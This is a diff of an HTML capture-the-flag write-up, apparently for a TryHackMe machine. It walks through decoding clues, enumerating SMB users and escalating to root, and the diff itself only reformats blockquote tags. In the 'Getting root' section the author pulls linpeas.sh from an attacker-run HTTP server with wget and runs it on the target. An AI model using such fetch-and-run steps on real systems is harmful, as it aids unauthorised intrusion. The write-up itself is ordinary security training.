@@ -46,7 +46,8 @@ Nov. 7, 2020
 <p><img src="https://i.imgur.com/oHD3Fi2.png" alt=""></p>
 <p>I&rsquo;m not sure the last decoding worked as expected. That certainly looks like a base64 encoding. This could very well be a rabbit hole.</p>
 <blockquote>
-<p>That didn&rsquo;t stop me from being stuck there for a couple of days trying my best to decode/decrypt it :laughing:</p></blockquote>
+<p>That didn&rsquo;t stop me from being stuck there for a couple of days trying my best to decode/decrypt it :laughing:</p>
+</blockquote>
 <p>Let&rsquo;s proceed further. Before, we found an image and we didn&rsquo;t really do anything with that. Let&rsquo;s see if we can find anything on it. Let&rsquo;s run <code>exifTool</code> on it:</p>
 <p><img src="https://i.imgur.com/n7B3xTJ.png" alt=""></p>
 <p>If we look carefully we see that we get a file owner name of <code>fijbxslz</code>. I don&rsquo;t know about you but that looks a bit off. Let&rsquo;s see if we can find any encoding/encryption match using <code>cyberChef</code>.</p>
@@ -69,7 +70,8 @@ Nov. 7, 2020
 <p><img src="https://i.imgur.com/gn9Imj8.png" alt=""></p>
 <p>That took a while, after trying a lot of combinations from the lyrics. Guess what? <code>birdistheword</code>! I mean, really. That was pretty obvious, and still I struggled for a good amount of time trying out combinations of words from that lyric. We should really have to start considering <code>occam's razor</code> more often. Lesson learned.</p>
 <blockquote>
-<p>Occam&rsquo;s razor is the principle that, of two explanations that account for all the facts, the simpler one is more likely to be correct. It is applied to a wide range of disciplines, including religion, physics, and medicine.</p></blockquote>
+<p>Occam&rsquo;s razor is the principle that, of two explanations that account for all the facts, the simpler one is more likely to be correct. It is applied to a wide range of disciplines, including religion, physics, and medicine.</p>
+</blockquote>
 <p><img src="https://i.imgur.com/m43Fvx9.png" alt=""></p>
 <p>Anyways, after a while of playing around with Cyberchef. It turns out decoding <code>vigenère</code> with that phrase from the lyrics of the song gives us a password.</p>
 <p>At this point we need to try those out, could those be for the login form we got before? I guess we have to check it to be sure. <code>cibartowski:easypass</code> there we go. I&rsquo;ll spare you the pain, that didn&rsquo;t work. That login form just doesn&rsquo;t seem to work.</p>
@@ -88,7 +90,8 @@ Nov. 7, 2020
 <p><img src="https://i.imgur.com/dd8s114.png" alt=""></p>
 <p>Ok, so the user we found before seems to be a decoy indeed to steer us away. After enumerating the users we see the username is actually <code>chuck</code>.</p>
 <blockquote>
-<p>NOTE: Don&rsquo;t be like me XD. If you look carefully at the results returned by autorecon which I did long AFTER doing this manually, you&rsquo;ll see that it already had returned us the username of <code>chuck</code>. So now you know, make sure to pay attention to all possible details and check you are not missing any details from the scan results.</p></blockquote>
+<p>NOTE: Don&rsquo;t be like me XD. If you look carefully at the results returned by autorecon which I did long AFTER doing this manually, you&rsquo;ll see that it already had returned us the username of <code>chuck</code>. So now you know, make sure to pay attention to all possible details and check you are not missing any details from the scan results.</p>
+</blockquote>
 <p>Let&rsquo;s see if we can actually connect to the share now (we can also see if maybe chuck is a valid user for FTP and SSH):</p>
 <p><img src="https://i.imgur.com/L7GSTnH.png" alt=""></p>
 <p>That worked, we are able to connect to that <code>classified</code> share now. And we can see there is a file in there. Let&rsquo;s see what it has for us:</p>
@@ -105,7 +108,8 @@ Nov. 7, 2020
 <h2 id="getting-root">Getting root</h2>
 <p>Now that we have our initial access, let&rsquo;s upload linpeas.sh and see what it finds for us. For that I fire up a <code>python3 -m http.server 80</code> in a local folder where I have the script. Then we just run <code>wget http://{your_IP}/linpeas.sh</code> into a writable directory.</p>
 <blockquote>
-<p>Remember to <code>chmod +x linpeas.sh</code> before running it.</p></blockquote>
+<p>Remember to <code>chmod +x linpeas.sh</code> before running it.</p>
+</blockquote>
 <p><img src="https://i.imgur.com/E73Uyfm.png" alt=""></p>
 <p>Now we just wait for linpeas to run through and show its results back.</p>
 <p>Right off the bat we get a possible PE vector:</p>
@@ -138,7 +142,8 @@ Nov. 7, 2020
 <h2 id="getting-the-bonus-flag">Getting the bonus flag</h2>
 <p>The hint for the last flag is <code>brings back so many memories</code>&hellip; Let&rsquo;s see if we can find that last flag by using <code>grep</code> command along with <code>find</code>. We&rsquo;ll try to look into files containing <code>THM</code> since that&rsquo;s probably another flag in the format of <code>THM{weird_random_values}</code>:</p>
 <blockquote>
-<p>You can check <a href="https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux">this</a> post to read about how to use find &amp; grep for this. Beware this will take some time since we&rsquo;ll be searching the whole machine. We should probably try to narrow down the search.</p></blockquote>
+<p>You can check <a href="https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux">this</a> post to read about how to use find &amp; grep for this. Beware this will take some time since we&rsquo;ll be searching the whole machine. We should probably try to narrow down the search.</p>
+</blockquote>
 <p>The command looks like this: <code>find . -type f -exec grep -sH 'THM{' {} \; 2&gt;/dev/null</code></p>
 <p>Spoiler: That approach is taking ages. Let&rsquo;s see if we can find the flag manually, we need to possibly look into logs or history files. If We look at the <code>.bash_history</code> we see a message there:</p>
 <p><img src="https://i.imgur.com/0KpzWOU.png" alt=""></p>
